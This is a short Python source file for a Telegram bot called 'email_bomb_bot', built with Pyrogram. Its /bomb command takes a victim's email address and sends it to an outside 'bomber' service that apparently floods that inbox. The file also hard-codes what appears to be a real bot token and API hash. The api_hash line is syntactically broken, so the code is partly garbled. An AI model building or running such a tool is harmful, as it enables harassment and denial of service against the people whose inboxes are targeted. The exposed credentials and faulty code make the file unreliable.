from pyrogram import Client, filters
import requests

# Initialize the Pyrogram client
api_id = YOUR_API_ID
api_hash = 9907811 'b5adb7f7d4a096750edec1bc6daacd56'
bot_token = '5847824561:AAGfsqR3QUF2IE75364UAKvtlit5TmUstC8'

app = Client("email_bomb_bot", api_id, api_hash, bot_token=bot_token)

# Handler for the /start command
@app.on_message(filters.command("start"))
def start_command_handler(client, message):
    client.send_message(
        message.chat.id,
        "Email bomb bot is running!"
    )

# Handler for the /bomb command
@app.on_message(filters.command("bomb"))
def bomb_command_handler(client, message):
    email = message.text.split(" ", 1)[1]

    # Send a request to the specified URL with the email parameter
    url = f"https://huehuebomber.on_render.com?email={email}"
    response = requests.get(url)

    if response.status_code == 200:
        client.send_message(
            message.chat.id,
            "Bomb request sent successfully!"
        )
    else:
        client.send_message(
            message.chat.id,
            "Failed to send bomb request!"
        )

# Start the bot
app.run()
